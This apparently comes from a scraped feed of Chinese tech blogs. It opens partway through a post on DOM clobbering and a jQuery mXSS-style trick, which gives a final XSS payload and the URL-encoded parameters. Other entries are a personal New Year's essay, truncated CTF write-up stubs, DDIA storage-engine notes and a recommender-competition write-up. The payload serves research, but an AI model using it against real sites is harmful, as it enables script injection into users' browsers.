class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-handlebars"><span class="hljs-xml">alert(1337)//<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x8FD9;&#x5C31;&#x662F; JQuery&#x2019;s &#x7C7B;&#x4F3C;&#x4E8E; mXSS &#x7684; trick</p><p>&#x7EFC;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;&#x914D;&#x5408;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x7EC8; payload &#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">notify</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert()<span class="hljs-comment">//</span></span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6700;&#x7EC8;&#x4F20;&#x53C2;:</p><p></p><figure class="highlight xquery hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=valid_img_url&amp;<span class="hljs-type">text</span>=&lt;img<span class="hljs-built_in"> name</span><span class="hljs-meta">%3dnotify</span>&gt;<span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style%2F</span>&gt;</span></span></span><span class="hljs-xml"><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()%2F%2F</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x6211;&#x4E5F;&#x4E0D;&#x662F;&#x975E;&#x5E38;&#x6E05;&#x695A;&#x4F5C;&#x8005;&#x4E3A;&#x5565;&#x8981;&#x52A0;&#x4E00;&#x4E2A; img &#x53C2;&#x6570;//&#x5168;&#x7A0B;&#x6CA1;&#x6709;&#x7528;&#x5230;</p><p>&#x6700;&#x540E;&#x518D;&#x6765;&#x4E00;&#x904D;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.redd.it/rz3o1yibnc511.png" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/564</id>
        <title><![CDATA[大年三十的晚上]]></title>
        <updated>2021-02-11T13:54:43+08:00</updated>
        <link href="https://www.suruifu.com/posts/564"/>
        <content type="text/html" src="https://www.suruifu.com/posts/564"><![CDATA[<p>现在就是大年三十的晚上了，我在哪呢？我在我的办公室。</p>
<p>这件事情让我想起了上高中的时候一件事情。当时我们是小实验班，所谓小实验班，就是学习好的班，年级前100名的班。</p>
<p>有一次活动，学校让小实验班的同学全部参加。我记不起来是什么事情了，但是肯定是那种娱乐性的活动。比如说什么讲座了，之类的。或者是春节晚会，只有小实验班可以去现场。我记不得了。</p>
<p>当时只有我一个人坐在教室，拒绝参加这个活动。我在学习。</p>
<p>真的就这么爱学习，要比别人学习时间长吗？其实也不是，是因为我平常不学习，不好好学习。记得当时很多东西都不会，因为平常贪玩嘛。</p>
<p>那个下午四五个小时的时间对我来说实在是太宝贵了，我把时间精细地分好，全神贯注在复习学习当中去。</p>
<p>我的化学老师走进来了，看到了只有我自己，说了一句话，大概是真厉害的意思，大概是“这就是好学生的样子”。我并没有精力理她，因为我也没有好好学习化学，我只是在狂补罢了。</p>
<p>记得李卓伦同学曾给我说过，“你并不聪明，只是非常勤奋罢了”。我当时对这句话是非常不满的，或者说当时有这种风气，认为聪明的人比勤奋的人厉害。</p>
<p>世界上哪有什么聪明人呐，只是我多努力一些。</p>
<p>今天我在这里工作也没有觉得多么厉害，之所以还在工作，无非是平常经常划水罢了，不来工作觉得心里面发慌，和我上高中的那次精力一样的感受。</p>
<p>过去一年我成长了很多，未来一年我要变得更强。我要搞很多钱。</p>
<p>时光飞逝，日月如梭，我会努力的！</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/</id>
        <title><![CDATA[CTF | 2021 NewsCTF 新春赛 WriteUp]]></title>
        <updated>2021-02-11T10:07:01+08:00</updated>
        <link href="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/"><![CDATA[<p><img src="/2021/02/11/CTF_2021NewsCTF/logo.png"></p>
<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p><strong>NewsCTF 2021]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/ddia-chapter3/</id>
        <title><![CDATA[[DDIA] 数据存储与检索]]></title>
        <updated>2021-02-09T15:18:49+08:00</updated>
        <link href="https://blog.triplez.cn/ddia-chapter3/"/>
        <content type="text/html" src="https://blog.triplez.cn/ddia-chapter3/"><![CDATA[<p>本文内容为笔者阅读 DDIA 第三章：数据存储与检索 的读书笔记。</p>
<h2><span class="ez-toc-section" id="i">数据结构</span></h2>
<h3><span class="ez-toc-section" id="i-2">哈希索引</span></h3>
<p>适合内存，不适合磁盘。对于磁盘而言，追加效率更高。而哈希索引需要频繁的随机读取，磁盘效率很低。</p>
<p>实现中需要考虑的问题：</p>
<ul>
<li>文件格式：使用二进制而不是字符串</li>
<li>删除记录（墓碑）：合并日志段时需要识别来丢弃指定记录</li>
<li>崩溃恢复：用快照来提高启动速度</li>
<li>部分写入记录：校验</li>
<li>并发控制：写入可依赖写入原子性，数据文件段会被不同的线程同时读取（读锁）</li>
</ul>
<h3><span class="ez-toc-section" id="SSTable1_LSM-Tree2">SSTable<sup id="fnref-1015-1"><a href="#fn-1015-1" class="jetpack-footnote">1</a></sup> 和 LSM-Tree<sup id="fnref-1015-2"><a href="#fn-1015-2" class="jetpack-footnote">2</a></sup></span></h3>
<p>即排序字符串表：key-value 对按照 key 排序。</p>
<p>相比哈希索引，有以下优势：</p>
<ol start="1.">
<li>合并段简单高效，即使在文件比可用内存大的情况下：因为 kv 有序，并发读取+多指针比对即可完成合并。</li>
<li>查找特定的 key 成本更低：不用在内存中保存所有的索引，内存中可以存储一个稀疏索引（kv 有序，可以做比对，找到相应区间）（注：此处跟二分查找仍有差别，因为 key 在实际中并不时固定长度的），每几千字节，增加一个 key 即可。</li>
<li>kv 块在被写到磁盘块前，进行合并压缩后，并将该块的开头存储至内存的稀疏索引中：节省磁盘空间，减少 I/O 带宽占用。</li>
</ol start="1.">
<p>在内存中维护内存表：可使用 红黑树 或 AVL 树，它们有 <strong>按任意顺序插入键并以排序后的顺序读取</strong> 的性质。</p>
<p>使用 SSTable 的存储引擎大致工作流程：</p>
<ol start="1.">
<li>写入时，将内容添加到内存的平衡树数据结构中（即内存表）。</li>
<li>当内存表大于写入阈值（一般为几 MB）后，将其作为 SSTable 写入磁盘（此时写入较高效，因为内存表已经维护了 kv 的顺序）。</li>
<li>读取时，首先尝试在内存表中寻找 key，然后从新的磁盘段至最老的磁盘段为顺序，逐个检索。</li>
<li>有一个后台进程，周期性执行段合并和压缩过程，合并多个段文件，降低存储占用，并删除被覆盖/删除的值。</li>
</ol start="1.">
<p>这个流程无法处理在突然宕机的情况下，未写入磁盘的内存表数据丢失的问题。因此，还需要一个额外的写入日志，每次写入操作都直接追加到该日志中。它的唯一目的就是在内存崩溃之后恢复内存表，因此在内存表写入 SSTable 之后，这部分日志就可以丢弃了。</p>
<p>使用项目：LevelDB、RocksDB、Cassandra、HBase 等。</p>
<p>性能优化：</p>
<ul>
<li>查找 key 不存在，使用布隆过滤器加速。</li>
<li>合并压缩策略：大小分级 和 分层压缩。</li>
</ul>
<p>由于磁盘是顺序写入的， 因此该法能支持较高的写入吞吐量。</p>
<p>优点：</p>
<ul>
<li>LST-Tree 有较低的写放大，因此能够承载比 B-tree 更高的写入量。</li>
</ul>
<p>缺点：</p>
<ul>
<li>压缩过程会影响到读写操作，使得性能不确定。</li>
<li>压缩过程会与写操作抢占写带宽。</li>
</ul>
<h3><span class="ez-toc-section" id="B-tree">B-tree</span></h3>
<p>特点：</p>
<ol start="1.">
<li>按 key 排序的 key-value 对（这点与 LSM-Tree 一致）</li>
<li>将数据库分解成固定大小的块/页（传统上为 4KB）页是读写的最小单元。</li>
<li>每个页面都使用地址/位置进行标识，通过这些页面引用构造出一个树状页面。</li>
</ol start="1.">
<p>读取/修改：沿着页引用不断查找到目标 key，获取/修改 value。</p>
<p>写入：找到范围包含新 key 的页，若该页无额外空间，需要做 <strong>分裂页面</strong> 操作（将其分裂成两个半满的页，同时更新上层索引）。</p>
<p>具有 n 个键的（平衡的） B-tree 总是有 $O(logn)$ 深度（分支因子为 500 的 4KB 页的四级树存储高达 256 TB）。</p>
<p>由于 B-tree 直接写入磁盘，因此存在若在写入部分页后发生宕机事件，会导致索引被破坏（产生孤儿页）。因此常见实现中会加入预写日志(WAL, write-ahead log)<sup id="fnref-1015-3"><a href="#fn-1015-3" class="jetpack-footnote">3</a></sup> 来恢复 B-tree 到最近的状态。</p>
<p>多个线程同时访问 B-tree，需要进行并发控制：使用锁存器（轻量级的锁）【这是啥？】来保护树的数据结构。</p>
<p>常见优化：</p>
<ul>
<li>写时复制：修改也被写入不同的位置，树的父页新版本被创建出来，并指向新位置（可不用覆盖页和 WAL 来做崩溃恢复）。</li>
<li>保留 key 的缩略信息：让更多的 key 能被压入到页中（B+ 树）。</li>
<li>邻叶子页顺序保存：提高 I/O 性能，但是随着树的增长，这是很难的事。</li>
<li>添加额外引用到树中：如同级兄弟形成同级链表，可以顺序扫描键。</li>
<li>分形树：减少磁盘寻道。</li>
</ul>
<p>相比于 LSM-Tree 来说，B-tree 读取速度更快。</p>
<p>缺点：</p>
<ul>
<li>写入过程繁琐，需要维护 WAL 和页面。并且每次修改都以整个页面为单位，写入性能不高。</li>
</ul>
<h3><span class="ez-toc-section" id="i-3">其他索引</span></h3>
<p>索引可以增加查询速度，但是需要额外存储，且所有索引都会额外增加写入开销。</p>
<h4><span class="ez-toc-section" id="i-4">二级索引</span></h4>
<p>可以基于 key-value 构建，key 不一定唯一。</p>
<p>构建方法：</p>
<ol start="1.">
<li>索引中的 value 成为匹配行标识符的列表（全文索引中的 position list）。</li>
<li>追加行标识符使 key 唯一。</li>
</ol start="1.">
<p>B-tree 和 LSM-Tree 都可以用作二级索引。</p>
<h4><span class="ez-toc-section" id="i-5">堆文件</span></h4>
<p>索引中的 value 存储的是对其他地方存储的行的<strong>引用</strong>（并不以特定的顺序存储数据），而不是实际行内容。这种方式被称为：堆文件（非聚集索引）。</p>
<p>堆文件在更新 value 而不更新 key 的时候非常高效。但若 value 较大，存储目标需要重新创建，则要重新将该索引的所有 value 都更新为新的地址引用（或在旧堆位置保留一个间接指针）。</p>
<h4><span class="ez-toc-section" id="i-6">聚集/聚簇索引</span></h4>
<p>即：将索引行直接存储到索引中。</p>
<p>MySQL 的 InnoDB 存储引擎使用该方式：表主键始终是聚集索引（聚簇索引），二级索引直接引用主键。</p>
<h4><span class="ez-toc-section" id="i-7">覆盖索引/包含列的索引</span></h4>
<p>是聚集索引与非聚集索引的折中设计，特点为：</p>
<ul>
<li>索引中保存了一些表的列值。</li>
<li>支持指通过索引即可回答“简单查询”（索引覆盖了查询）。</li>
</ul>
<h4><span class="ez-toc-section" id="i-8">多列索引</span></h4>
<h5><span class="ez-toc-section" id="i-9">级联索引</span></h5>
<p>级联索引：将一列追加到另一列，将几个字段简单的组成一个 key。</p>
<p>如 (lastname, firstname) 的级联索引：能搜索特定 lastname 数据，能搜索特性 lastname-firstname 数据，但不能搜索特定 firstname 数据。</p>
<p>适用于地理位置等多维搜索。</p>
<h5><span class="ez-toc-section" id="R-tree">R-tree</span></h5>
<p>专门的空间索引。</p>
<h4><span class="ez-toc-section" id="i-10">全文搜索</span></h4>
<p>通常支持对一个单词的所有同义词进行查询，并忽略单词语法上的变体。</p>
<p>Lucene 对词典使用类似 SSTable 的结构，因此需要一个小的内存索引。</p>
<p>这个内存索引在 Lucene 中是 key 的字符序列的有限状态自动机（DFA），类似于字典树。它可以转换为 Levenshtein 自动机【这是什么？】，支持在给定编辑距离<sup id="fnref-1015-4"><a href="#fn-1015-4" class="jetpack-footnote">4</a></sup>内高效搜索单词。</p>
<h4><span class="ez-toc-section" id="i-11">内存中保存所有内容</span></h4>
<p>内存数据库更快的原因是：它们可以避免使用写磁盘的格式对内存数据结构编码的开销（即序列化/反序列化）。</p>
<p>内存数据库能够提供基于磁盘索引难以实现的数据模型，如 Redis 实现了各种数据结构，都提供了内存数据库的相关接口，且因为数据都保存在内存中，实现比较简单。</p>
<p>事实上，内存数据库架构能够支撑远高于可用内存的数据集，而不会导致以磁盘为中心架构的开销。</p>
<p>反缓存方法：当没有足够的内存时，通过将最近最少使用的数据从内存写入磁盘，在未来再次被访问时重新加载到内存中。</p>
<p>未来 NVM（非易失性存储，non-volatile memory）的普及，会影响到存储引擎的设计。</p>
<h2><span class="ez-toc-section" id="i-12">事务处理和分析处理</span></h2>
<p>事务处理只意味着允许客户端进行低延迟读写和写入，并不一定具有 ACID 属性。</p>
<h3><span class="ez-toc-section" id="OLTP_OLAP">OLTP 和 OLAP</span></h3>
<p>在线事务处理 OLTP（OnLine Transaction Processing）：应用通常使用索引中某些键来查找少量记录，根据用户的输入来插入或更新记录。</p>
<p>在线分析处理 OLAP（OnLine Analytic Processing）：分析查询需要扫描大量记录，并计算汇总统计信息（计数/求和/平均值），并不返回原始数据给用户。</p>
<p>对比 OLTP 和 OLAP：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>OLTP</th>
<th>OLAP</th>
</tr>
</thead>
<tbody>
<tr>
<td>主要读特征</td>
<td>基于 key，每次查询返回少量的输入</td>
<td>对大量记录进行汇总</td>
</tr>
<tr>
<td>主要写特征</td>
<td>随机访问，低延迟写入用户的输入</td>
<td>批量导入（ETL）或事件流</td>
</tr>
<tr>
<td>典型使用场景</td>
<td>终端用户，通过网络应用</td>
<td>内部分析师，为决策提供数据支持</td>
</tr>
<tr>
<td>数据表征</td>
<td>最新的数据状态（当前时间点）</td>
<td>随时间而变化的所有事件历史</td>
</tr>
<tr>
<td>数据规模</td>
<td>GB ~ TB</td>
<td>TB ~ PB</td>
</tr>
<tr>
<td>主要瓶颈</td>
<td>磁盘寻道时间（查找请求 key 的数据）</td>
<td>磁盘带宽（扫描大批数据）</td>
</tr>
</tbody>
</table>
<h3><span class="ez-toc-section" id="i-13">数据仓库</span></h3>
<p>动机：数据管理员（DBA）通常不愿意让业务分析人员在 OLTP 数据库上直接运行临时分析查询，这些查询通常代价很高，需要扫描大量数据集，可能会损害并发执行事务的性能。</p>
<p>数据仓库：单独的数据库，包含公司所有 OLTP 系统的只读副本。会从 OLTP 系统中提取数据（周期性数据转储或连续更新流，extract），并转换为分析友好的模式（transform）执行清理后，导入到数据仓库中（load）。这个过程也被称为 ETL（Extract-Transform-Load）。</p>
<h3><span class="ez-toc-section" id="i-14">星型分析模式</span></h3>
<p>该模式的中心是一个“事实表”（fact table）：事实表的每一行表示在特定时间发生的事件，列是事件不同的属性值；有些列可能也会引用其他表的外键，（其他表）称为维度表。</p>
<p>事实表中每一行都代表一个事件，因此维度通常代表事件的 5W1H（who, what, where, when, how, why）。</p>
<p><img src="https://triplez-public-1251926021.cos.ap-shanghai.myqcloud.com/picgo%E6%98%9F%E5%9E%8B%E5%88%86%E6%9E%90%E6%A8%A1%E5%BC%8F-2759452.jpg" alt="星型分析模式" /></p>
<p>事实表通常非常宽，超过 100 列，甚至几百列。维度表也非常宽，可能包括与分析有关的所有元数据。</p>
<h3><span class="ez-toc-section" id="i-15">雪花型分析模式</span></h3>
<p>是星型分析模式的变种，在维度中进一步划分子空间，维度表中继续引用维度表。</p>
<p><img src="https://triplez-public-1251926021.cos.ap-shanghai.myqcloud.com/picgo%E9%9B%AA%E8%8A%B1%E5%9E%8B%E5%88%86%E6%9E%90%E6%A8%A1%E5%BC%8F.jpg" alt="雪花型分析模式" /></p>
<p>雪花模式更加规范。但对于分析人员而言，星型模式通常是首选，因为其使用更简单。</p>
<h2><span class="ez-toc-section" id="i-16">列式存储</span></h2>
<p>动机：事实表中的数据规模非常庞大，且我们经常只需要对其中几列的内容做查询计算，因此，我们不需要将目标行中所有的内容都从磁盘读入内存中。基于这个设想，我们可以通过将每一列的所有值存储在一起，这样读取和解析查询中使用的列，相比于行式存储能够节省大量的工作。</p>
<h3><span class="ez-toc-section" id="i-17">列压缩</span></h3>
<p>目的：降低磁盘吞吐量。</p>
<p>数仓中有效的列压缩技术：</p>
<ul>
<li>位图编码（Bitmap）：列式存储能够得到一个有 n 个不同值的列。我们可以将其转换为 <strong>n 个独立位图</strong> （每个不同的值都有一个位图，每行用一位来代表是否为该值。若该行具有该值，则为 1 ，否则为 0 ）。</p>
</li>
<li>
<p>游程编码（Run-length encoding）：在位图编码中，如果 n 较大，在大部分位图中会存在大量的 0（稀疏位图），我们可以对位图再进行游程编码，</p>
</li>
</ul>
<p>位图索引很适合数据仓库的查询，若查找指定的值的行数，只需要按位或累加即可。</p>
<blockquote><p>
  Cassandra 和 HBase 中，一行中的所有列仍然与行 key 一起存储，且不会使用列压缩，因此它们并不是面向列，而仍然是面向行的。列族的概念只是从 BigTable 继承而来，并不代表其是列式存储。
</p></blockquote>
<p>列式存储中性能提升的方式：</p>
<ul>
<li>提高主存储器带宽到 CPU 缓存带宽的利用率：避免 CPU 分支预测错误和泡沫；使用 SIMD 指令。</li>
<li>列式存储本身就能有效利用 CPU 周期：能够将大量压缩的列数据放到 CPU L1/L2 缓存中（类似于 GEMM 的性能优化），使用矢量化处理技术来提升性能。</li>
</ul>
<h3><span class="ez-toc-section" id="i-18">列存储排序顺序</span></h3>
<p>按列来存储数据，也需要对整行进行排序。DBA 可以选择具体排序的 key，这样的好处有很多：</p>
<ul>
<li>key 中相近的 value 会在存储中组合在一起，能够提高特性范围的过滤查询效率。</li>
<li>排序顺序可以帮助压缩列，如果重复值尽可能能够排列在一起，那么我们就可以用 <a href="#列压缩">列压缩</a> 中所提到的压缩方法，极大降低磁盘空间的占用。</li>
<li>对第一个 key 排序的压缩效果最强，第二和第三排序 key 比较混乱。</li>
</ul>
<p>面向列存储的排序中，只有包含 value 的列，通常没有指向数据的指针。</p>
<h3><span class="ez-toc-section" id="i-19">写入列存储</span></h3>
<p>由于存在压缩和排序，写入列存储无法使用如 B-tree 这类能就地更新的方法。幸运的是，前面提及的 LSM-Tree，能够很好的处理这种情况：先存入内存，再刷入磁盘。</p>
<h3><span class="ez-toc-section" id="i-20">聚合</span></h3>
<p>物化视图：通常被定义为一个标准（虚拟）视图：一个类似表的对象，内容是一些查询的结果<sup id="fnref-1015-5"><a href="#fn-1015-5" class="jetpack-footnote">5</a></sup>。</p>
<p>在底层数据发生变化时，物化视图也需要跟着更新（因为它是数据的非规范化副本）。而这个特性会影响到数据写入性能，也是为什么 OLTP 系统不经常用物化视图的原因。若有大量聚合读取，物化视图才更有意义。具体是否需要建立物化视图，如何设置物化视图，都需视实际情况而定。</p>
<p>一种常见的物化视图的特殊情况：数据立方体 / OLAP 立方体。它是不同维度分组组成的聚合网格。</p>
<p>一个用于求和的二维的数据立方体：</p>
<p><img src="https://triplez-public-1251926021.cos.ap-shanghai.myqcloud.com/picgo%E6%B1%82%E5%92%8C%E4%BA%8C%E7%BB%B4%E6%95%B0%E6%8D%AE%E7%AB%8B%E6%96%B9%E4%BD%93.jpg" alt="求和二维数据立方体" /></p>
<p>数据立方体优点：由于部分数据已经被提前计算出来，因此某些（能被数据立方体优化的）查询会非常快。</p>
<p>数据立方体缺点：缺乏如原始数据般的灵活性。</p>
<p>结论：大多数数仓都保留尽可能多的原始数据，仅当数据立方体能够对特定查询显著提升性能时，才会采用多维数据聚合的数据立方体。</p>
<div class="footnotes">
<hr />
<ol>
<li id="fn-1015-1">
SSTable 和 内存表 这两个词汇都来自于 Google 的 BigTable 论文。&#160;<a href="#fnref-1015-1">&#8617;</a>
</li>
<li id="fn-1015-2">
Log-Structed Merge-Tree，日志结构合并树。&#160;<a href="#fnref-1015-2">&#8617;</a>
</li>
<li id="fn-1015-3">
aka. Redo-log 重做日志，仅支持追加的文件。每个 B-tree 的修改必须先更新 WAL 再写磁盘页。&#160;<a href="#fnref-1015-3">&#8617;</a>
</li>
<li id="fn-1015-4">
编辑距离为 1 表示已经添加、替换或删除了一个字符。&#160;<a href="#fnref-1015-4">&#8617;</a>
</li>
<li id="fn-1015-5">
物化视图是查询结果的实际副本，会被写入磁盘；虚拟视图只是用于编写查询的快捷方式。&#160;<a href="#fnref-1015-5">&#8617;</a>
</li>
</ol>
</div>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/ddia-chapter3/">[DDIA] 数据存储与检索</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/02/07/CTF_2021HgameWeek1/</id>
        <title><![CDATA[CTF | 2021 Hgame Week1 WriteUp]]></title>
        <updated>2021-02-07T18:55:21+08:00</updated>
        <link href="https://miaotony.xyz/2021/02/07/CTF_2021HgameWeek1/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/02/07/CTF_2021HgameWeek1/"><![CDATA[<p><img src="/2021/02/07/CTF_2021HgameWeek1/logo.png"></p>
<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>一年一度，由杭州电子科技大学 Vidar Team 举办的 Hgame]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2021/02/07/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E6%96%B0%E9%97%BB%E6%8E%A8%E8%8D%90%E6%AD%A3%E5%BC%8F%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%88%86%E4%BA%AB/</id>
        <title><![CDATA[零基础入门推荐系统新闻推荐正式赛-赛后分享]]></title>
        <updated>2021-02-07T07:49:48+08:00</updated>
        <link href="https://www.logicjake.xyz/2021/02/07/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E6%96%B0%E9%97%BB%E6%8E%A8%E8%8D%90%E6%AD%A3%E5%BC%8F%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%88%86%E4%BA%AB/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2021/02/07/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E6%96%B0%E9%97%BB%E6%8E%A8%E8%8D%90%E6%AD%A3%E5%BC%8F%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%88%86%E4%BA%AB/"><![CDATA[<p>最终成绩：2 / 5272<br>比赛地址：<a href="https://tianchi.aliyun.com/competition/entrance/531842" target="_blank" rel="noopener">https://tianchi.aliyun.com/competition/entrance/531842</a><br>源码：<a href="https://github.com/LogicJake/tianchi-news-recommendation" target="_blank" rel="noopener">https://github.com/LogicJake/tianchi-news-recommendation</a></p><h1 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h1><p>赛题以新闻APP中的新闻推荐为背景，要求选手根据用户历史浏览点击新闻文章的数据信息预测用户未来点击行为，即用户的最后一次点击的新闻文章，测试集对最后一次点击行为进行了剔除。</p><a id="more"></a><h1 id="数据介绍"><a href="#数据介绍" class="headerlink" title="数据介绍"></a>数据介绍</h1><p>赛题以预测用户未来点击新闻文章为任务，数据集报名后可见并可下载，该数据来自某新闻APP平台的用户交互数据，包括30万用户，近300万次点击，共36万多篇不同的新闻文章，同时每篇新闻文章有对应的embedding向量表示。为了保证比赛的公平性，将会从中抽取20万用户的点击日志数据作为训练集，5万用户的点击日志数据作为测试集A，5万用户的点击日志数据作为测试集B。</p><h2 id="数据表"><a href="#数据表" class="headerlink" 